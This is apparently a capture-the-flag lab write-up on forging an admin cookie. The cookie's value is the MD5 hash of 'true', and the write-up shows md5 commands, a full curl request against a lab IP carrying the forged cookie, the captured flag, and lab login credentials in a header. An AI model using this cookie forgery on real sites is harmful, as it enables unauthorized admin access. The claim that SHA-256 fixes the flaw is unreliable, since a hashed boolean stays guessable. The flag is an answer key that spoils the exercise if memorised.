# Cookie - Encryption failure

### Breach description

Change Cookie value I_am_admin to true hashed through md5

```bash
md5 -s false
md5 -s true
```

```bash
curl 'http://192.168.64.6/' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://192.168.64.6/index.php?page=signin&username=root&password=pussy&Login=Login' -H 'Connection: keep-alive' -H 'Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09' -H 'Upgrade-Insecure-Requests: 1'
```

Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

### Explanation of the breach

MD5 is a hashing algorithm that is considered unsafe. True/False are value that are easy to guess. 

### Breach Fix

Use a stronger hashing algorithm like sha256. Implement randomly generated token system for authentication.
